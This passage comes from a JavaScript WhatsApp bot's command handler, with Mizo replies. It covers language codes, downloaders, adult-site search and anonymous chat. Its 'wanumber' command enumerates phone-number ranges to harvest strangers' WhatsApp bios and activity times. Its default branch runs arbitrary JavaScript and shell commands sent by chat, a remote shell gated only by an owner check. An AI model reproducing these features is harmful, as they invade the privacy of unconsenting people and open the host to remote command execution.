                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
        case '/codelang': {
replyherbertstyle(`
Amharic = am
Arabic = ar
Basque = eu
Bengali = bn
English (UK) = en-GB
Portuguese (Brazil) = pt-BR
Bulgarian = bg
Catalan = ca
Cherokee = chr
Croatian = hr
Czech = cs
Danish = da
Dutch = nl
English (US) = en
Estonian = et
Filipino = fil
Finnish = fi
French = fr
German = de
Greek = el
Gujarati = gu
Hebrew = iw
Hindi = hi
Hungarian = hu
Icelandic = is
Indonesian = id
Italian = it
Japanese = ja
Kannada = kn
Korean = ko
Latvian = lv
Lithuanian = lt
Malay = ms
Malayalam = ml
Marathi = mr
Mizo = lus
Norwegian = no
Polish = pl
Portuguese (Portugal) = pt-PT
Romanian = ro
Russian = ru
Serbian = sr
Chinese (PRC) = zh-CN
Slovak = sk
Slovenian = sl
Spanish = es
Swahili = sw
Swedish = sv
Tamil = ta
Telugu = te
Thai = th
Chinese (Taiwan) = zh-TW
Turkish = tr
Urdu = ur
Ukrainian = uk
Vietnamese = vi
Welsh = cy `
)
        } break
case 'myip': {
        if (!HerbertTheCreator) return m.reply(mess.owner)
        if (m.isGroup) return m.reply(mess.private)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replyherbertstyle("🔎 I ip address chu: " + ip)
                    })
                })
            }
        break
case 'gdrive': {
		if (!args[0]) return replyherbertstyle(`Google Drive link rawn dah rawh`)
	await loading()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replyherbertstyle(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	HBWABotInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } 

catch {
	replyherbertstyle('Error: Link dang rawn ti rawh') 
  }
}
break
case "xnxxdl": {
	if (!isPrem) return replyprem(mess.premium)
	if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
	if (!text) return replyherbertstyle(`Enter Url`)
        if (!text.includes('xnxx.com')) return replyherbertstyle(`xnxx link rawn dah rawh`)
        await loading()
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
HBWABotInc.sendMessage(m.chat, { caption: `≡  *XNXX DL*
        
▢ *📌Title*: ${xn.result.title}
▢ *⌚Duration:* ${xn.result.duration}
▢ *🎞️Quality:* ${xn.result.quality}`, video: {url: xn.result.files.high} }, { quoted: m })

}
break
case 'xnxxsearch': {
	if (!isPrem) return replyprem(mess.premium)
	if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
	if (!text) return replyherbertstyle(`A title rawn dah rawh!..`)
	await loading()
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replyherbertstyle(ff)
              
              }
              break
              case 'pinterest': {
              	if (!text) return replyherbertstyle(`A title rawn dah rawh!..`)
await loading()
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
HBWABotInc.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })

}
break
case 'ringtone': {
		if (!text) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		HBWABotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
           case 'wanumber': case 'searchno': case 'searchnumber':{
           	if (!text) return replyherbertstyle(`Provide Number with last number x\n\nTiang hian tih tur : ${prefix + command} 91841609365x`)
var inputnumber = text.split(" ")[0]
        
        replyherbertstyle(`I range rawn dah account te chu zawn mek an ni...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*I range rawn dahah khian WhatsApp a khawih ve lo.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await HBWABotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await HBWABotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replyherbertstyle(`${text66}${nobio}${nowhatsapp}`)
        }
break

default:

if (budy.startsWith('<')) {
if (!HerbertTheCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('vv')) {
if (!HerbertTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!HerbertTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: false,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
HBWABotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
HBWABotInc.sendMessage(`${hbmods}@s.whatsapp.net`, { text: `Hi ${Englo} he lai hi siamthat a ngai e👇\n` + util.format(e),
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
